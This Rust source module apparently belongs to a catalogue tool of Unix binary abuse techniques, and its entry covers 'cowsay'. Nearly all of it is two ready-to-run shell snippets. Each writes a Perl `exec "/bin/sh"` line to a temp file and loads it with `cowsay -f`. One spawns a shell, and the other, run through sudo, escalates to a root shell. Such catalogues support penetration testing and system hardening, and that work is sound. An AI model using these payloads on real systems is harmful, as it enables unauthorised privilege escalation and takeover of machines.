
pub static BIN_NAME: &'static str = "cowsay";
pub static BIN_DESC: &'static str = "It allows to execute `perl` code, other functions may apply.";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'exec "/bin/sh";' >$TF
    cowsay -f $TF x
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'exec "/bin/sh";' >$TF
    sudo cowsay -f $TF x
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
